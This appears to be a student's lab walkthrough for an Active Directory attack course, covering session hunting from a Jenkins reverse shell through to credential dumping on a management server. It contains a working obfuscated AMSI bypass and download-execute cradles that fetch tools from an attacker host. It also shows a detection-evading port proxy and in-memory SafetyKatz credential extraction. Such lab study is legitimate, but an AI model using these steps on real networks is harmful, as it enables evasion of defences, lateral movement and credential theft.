# Learning Objtetive 7

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* dcorp-mgmt - Process using svcadmin as service account
* dcorp-mgmt - NTLM hash of svcadmin account
* dcorp-adminsrv - We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.
* dcorp-adminsrv - NTLM hash of srvadmin extracted from dcorp-adminsrv
* dcorp-adminsrv - NTLM hash of websvc extracted from dcorp-adminsrv
* dcorp-adminsrv - NTLM hash of appadmin extracted from dcorp-adminsrv

## Identify a machine where Domain Admin session is available

We have access to two domain users - studentx and ciadmin and administrative access to dcorpadminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

#### Invisi-Shell

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

### Session Hunting - Lateral Movement

#### Without target

> Enumrate all computers/server of domain

<pre><code>Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

HostName       UserSession         Access
--------       -----------         ------
dcorp-appsrv   dcorp\appadmin       False
dcorp-ci       dcorp\ciadmin        False
dcorp-mgmt     dcorp\mgmtadmin      False
dcorp-mssql    dcorp\sqladmin       False
dcorp-dc       dcorp\Administrator  False
dcorp-mgmt     dcorp\svcadmin       False
us-dc          US\Administrator     False
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\appadmin        True</a>
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\srvadmin        True</a>
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\websvc          True</a>
</code></pre>

To make the above enumeration more opsec friendly and avoid triggering tools like MDI, we can query specific target machines.&#x20;

Now, we need to create 'servers.txt' saving the true hostnames and use the below command:

#### With targets

> Using unil the list of target, dont search computers/servers into domain

```
Get-DomainComputer | select -ExpandProperty dnshostname > C:\AD\Tools\servers.txt
```

<pre><code>Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access

HostName       UserSession     Access
--------       -----------     ------
DCORP-APPSRV   dcorp\appadmin   False
DCORP-CI       dcorp\ciadmin    False
DCORP-MGMT     dcorp\mgmtadmin  False
DCORP-MSSQL    dcorp\sqladmin   False
DCORP-MGMT     dcorp\svcadmin   False
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\appadmin    True</a>
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\srvadmin    True</a>
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\websvc      True</a>
</code></pre>

Sweet! There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes later.

***

Enumeration using PowerView


> We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
>
> We can use Powerview?s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging.
>
> First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial download-execute cradle that we used in Jenkins.
>
> The below command bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the download-exec cradle.&#x20;
>
> Remember to host the sbloggingbypass.txt on a web server on the student VM if you use the download-exec cradle :

### Bypass ScriptBlock Logging

> Info: Bypass Windows logs of PowerShell commands.
>
> Into (user RCE jenkings)

Upload the file sbloggingbypass.txt --->

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/sbloggingbypass.txt'))
```

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Bypass AMSI

> Info: AMSI scans scripts before execution.

Upload the file Amsi-Byp.txt to bypass the AMS after, it contains -->

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Amsi-Byp.txt'))
```

> ```
> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
> ```

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Execute PowerView

Upload PoweView to execute commnads -->

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/PowerView.ps1'))
```

Once we do all, can execute commands -->

<pre><code>Find-DomainUserLocation

UserDomain      : DCORP-MGMT
UserName        : Administrator
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
<a data-footnote-ref href="#user-content-fn-1">UserName        : svcadmin</a>
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
</code></pre>

Great! There is a domain admin session on dcorp-mgmt server!

Now, we can abuse this using winrs or PowerShell Remoting!

Use winrs to access dcorp-mgmt


Let's check if we can execute commands on dcorp-mgmt server and if the winrm port is open:

```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"

COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin
```

It\`s open and we ad ciadmin so... we can execute commands too into this machine

We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.

> ```
> [ Attacker VM ] 172.16.100.113
>         |
>         |  (HFS / nc / payload hosting)
>         v
> [ Jenkins → rsh -> dcorp-ci ]
> User: builduser → ciadmin
>         |
>         |  (PowerView / SessionHunter)
>         |  (winrs / PSRemoting / SMB)
>         v
> [ dcorp-mgmt ]
> User: ciadmin
>         |
>         |  (Loader + SafetyKatz / Mimikatz)
>         v
> [ Domain Admin ]
> User: svcadmin
>         |
>         |  (GPO / Full Control)
>         v
> [ dcorp-dc ]
> Domain Owned
> ```

Run the following command on the reverse shell:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

```
iwr http://172.16.100.113/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Now, copy the Loader.exe to dcorp-mgmt:

```
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.113"
```

> Note: Please note that we have to use the $null variable to address output redirection issues.

### SafetyKatz in-memory using

To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell:

```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

[^1]: 
